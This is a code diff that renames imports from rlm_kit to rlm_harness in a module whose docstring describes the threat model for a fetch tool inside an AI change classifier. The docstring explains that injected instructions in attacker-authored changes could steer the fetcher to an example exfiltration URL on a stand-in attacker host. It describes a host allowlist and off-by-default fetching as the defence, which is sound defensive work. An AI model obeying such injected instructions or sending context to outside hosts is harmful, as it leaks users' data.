@@ -2,7 +2,7 @@
 
 The threat model here is sharper than a normal fetch tool's: the change under classification is
 ATTACKER-AUTHORED, so an injected instruction could try to steer a fetcher into
-`GET https://attacker.tld/?leak=<context>` — a data-exfiltration channel. rlm-kit's SSRF guard blocks
+`GET https://attacker.tld/?leak=<context>` — a data-exfiltration channel. rlm-harness's SSRF guard blocks
 INTERNAL/metadata targets, but an attacker-EXTERNAL URL is its allowed case. So this wrapper adds a HOST
 ALLOWLIST on top: only GitHub API/content hosts are reachable, and there is no way to fetch a
 "referenced URL" the change names. Enrichment is OFF by default (`enable_fetch=False`) for the same
@@ -17,8 +17,8 @@ from __future__ import annotations
 from collections.abc import Callable
 from urllib.parse import urlparse
 
-from rlm_kit.tools import is_safe_url, parse_cidrs, resolved_host_is_safe
-from rlm_kit.trace import record_tool_call
+from rlm_harness.tools import is_safe_url, parse_cidrs, resolved_host_is_safe
+from rlm_harness.trace import record_tool_call
 
 from .config import DetectConfig
 
